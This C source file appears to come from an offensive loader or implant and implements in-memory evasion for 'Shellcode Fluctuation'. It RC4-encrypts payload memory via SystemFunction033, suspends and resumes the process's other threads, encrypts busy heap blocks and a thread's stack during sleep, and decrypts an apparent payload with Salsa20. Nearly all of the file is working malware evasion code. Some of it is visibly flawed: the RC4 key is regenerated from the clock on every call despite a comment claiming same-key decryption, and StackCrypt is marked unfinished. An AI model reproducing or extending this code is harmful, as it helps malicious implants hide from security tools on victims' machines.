#include "Common.h"
#include "Salsa20.h"
#include <time.h>

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

// technically you shouldn't use RC4 encryption, and should use AES instead, but this is specifically for the Shellcode Fluctuation
// this allows for easy encryption|decryption with the same key

VOID RC4
(
	_In_ PVOID	PayloadAddress,
	_In_ SIZE_T PayloadSize
)
{

	//------------------------------------------------------

	BYTE	Rc4Key[16]	= { 0 };
	USTRING Key			= { .Buffer = (PUCHAR)&Rc4Key };			Key.Length	= Key.MaximumLength		= sizeof(Rc4Key);
	USTRING Data		= { .Buffer = (PUCHAR)PayloadAddress };		Data.Length = Data.MaximumLength	= PayloadSize;

	//------------------------------------------------------

	srand((unsigned)time(NULL));

	for (int i = 0; i < 16; i++)
		Rc4Key[i] = (UCHAR)(rand() % 256);

	pSystemFunction033(&Data, &Key);

	//------------------------------------------------------

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

// we will also use the RC4 encryption for the Heap & Stack Encryption, which will be used in the My_Sleep function

BOOLEAN CryptSuspendThreads(void)
{

	//------------------------------------------------------

	HANDLE			SnapHandle		= NULL;
	HANDLE			ThreadHandle	= NULL;
	THREADENTRY32	te32			= { 0 };

	//------------------------------------------------------

	pRtlSecureZeroMemory(&te32, sizeof(THREADENTRY32));
	te32.dwSize = sizeof(THREADENTRY32);

	if ((SnapHandle = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pGetCurrentProcessId())) == INVALID_HANDLE_VALUE)
	{
#ifdef DEBUG
		PRINT_ERROR("CreateToolhelp32Snapshot");
#endif
		return FALSE;
	}

	if (!pThread32First(SnapHandle, &te32))
	{
#ifdef DEBUG
		PRINT_ERROR("Thread32First");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	do
	{

		if (te32.th32OwnerProcessID == pGetCurrentProcessId() && te32.th32ThreadID != pGetCurrentThreadId())
		{
			if (!(ThreadHandle = pOpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID)))
			{
#ifdef DEBUG
				PRINT_ERROR("OpenThread");
#endif
				return FALSE;
			}

			pSuspendThread(ThreadHandle);
			pCloseHandle(ThreadHandle);
		}

	} while (pThread32Next(SnapHandle, &te32));

	//------------------------------------------------------

	pCloseHandle(SnapHandle);
	return TRUE;

}

BOOLEAN CryptResumeThreads(void)
{

	//------------------------------------------------------

	HANDLE			SnapHandle		= NULL;
	HANDLE			ThreadHandle	= NULL;
	THREADENTRY32	te32			= { 0 };

	//------------------------------------------------------

	pRtlSecureZeroMemory(&te32, sizeof(THREADENTRY32));
	te32.dwSize = sizeof(THREADENTRY32);

	if ((SnapHandle = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pGetCurrentProcessId())) == INVALID_HANDLE_VALUE)
	{
#ifdef DEBUG
		PRINT_ERROR("CreateToolhelp32Snapshot");
#endif
		return FALSE;
	}

	if (!pThread32First(SnapHandle, &te32))
	{
#ifdef DEBUG
		PRINT_ERROR("Thread32First");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	do
	{

		if (te32.th32OwnerProcessID == pGetCurrentProcessId() && te32.th32ThreadID != pGetCurrentThreadId())
		{
			if (!(ThreadHandle = pOpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID)))
			{
#ifdef DEBUG
				PRINT_ERROR("OpenThread");
#endif
				return FALSE;
			}

			pResumeThread(ThreadHandle);
			pCloseHandle(ThreadHandle);
		}

	} while (pThread32Next(SnapHandle, &te32));

	//------------------------------------------------------

	pCloseHandle(SnapHandle);
	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN HeapCrypt(void)
{

	//------------------------------------------------------

	PROCESS_HEAP_ENTRY	HeapEntry		= { 0 };
	DWORD				NumberOfHeaps	= pGetProcessHeaps(0, NULL);;
	PHANDLE				HeapHandle		= NULL;

	//------------------------------------------------------

	if ((HeapHandle = HeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)NumberOfHeaps * sizeof(PVOID))) == NULL)
	{
#ifdef DEBUG
		PRINT_ERROR("HeapAlloc");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	if (pGetProcessHeaps(NumberOfHeaps, HeapHandle))
	{

		for (DWORD i = 0; i < NumberOfHeaps; i++)
		{

			if (HeapHandle[i] == pGetProcessHeap())
				continue;

			pRtlSecureZeroMemory(&HeapEntry, sizeof(PROCESS_HEAP_ENTRY));
			while (pHeapWalk(HeapHandle[i], &HeapEntry))
			{

				if ((HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0)
				{
					RC4(HeapEntry.lpData, (SIZE_T)HeapEntry.cbData);
				}

			}

		}
		pHeapFree(pGetProcessHeap(), 0, HeapHandle);

	}

	//------------------------------------------------------

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN StackCrypt // todo: fix this
(
	_In_ HANDLE ThreadHandle
)
{

	//------------------------------------------------------

	NTSTATUS					Status		= STATUS_SUCCESS;

	PVOID						Teb			= NULL;
	PVOID						StackTop	= NULL;
	PVOID						StackBase	= NULL;

	PNT_TIB						Tib			= NULL;
	SIZE_T						BytesRead	= 0;
	THREAD_BASIC_INFORMATION	TBI			= { 0 };

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtQueryInformationThread(ThreadHandle, (THREADINFOCLASS)0, &TBI, sizeof(TBI), NULL)))
	{
#ifdef DEBUG
		NT_ERROR("NtQueryInformationThread");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	if ((Tib = (PNT_TIB)HeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(NT_TIB))) == NULL)
	{
#ifdef DEBUG
		PRINT_ERROR("HeapAlloc");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	Teb = TBI.TebBaseAddress;
	if (!pReadProcessMemory(pGetCurrentProcess(), Teb, Tib, sizeof(NT_TIB), &BytesRead))
	{
#ifdef DEBUG
		PRINT_ERROR("ReadProcessMemory");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	StackTop	= Tib->StackLimit;
	StackBase	= Tib->StackBase;

	RC4(StackTop, (SIZE_T)StackBase - (SIZE_T)StackTop);

	pHeapFree(pGetProcessHeap(), 0, Tib);

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN Salsa20Crypt
(
	_In_    const UCHAR* CipherText,
	_In_    SIZE_T CipherTextSize,
	_In_    const UCHAR* Key,
	_In_    const UCHAR* Nonce,
	_Out_   UCHAR* PlainText
)
{
	salsa20_state   st = { 0 };
	int             error = 0;

	if (!CipherText || !Key || !Nonce || !PlainText)
		return FALSE;

	if ((error = salsa20_setup(&st, Key, 32, 20)) != CRYPT_OK)
	{
#ifdef DEBUG
		WARN("Salsa20_setup: %d", error);
#endif
		return FALSE;
	}

	if ((error = salsa20_ivctr64(&st, Nonce, 8, 0)) != CRYPT_OK)
	{
#ifdef DEBUG
		WARN("Salsa20_ivctr64: %d", error);
#endif
		return FALSE;
	}

	if ((error = salsa20_crypt(&st, CipherText, CipherTextSize, PlainText)) != CRYPT_OK)
	{
#ifdef DEBUG
		WARN("Salsa20_crypt: %d", error);
#endif
		return FALSE;
	}

	return TRUE;
}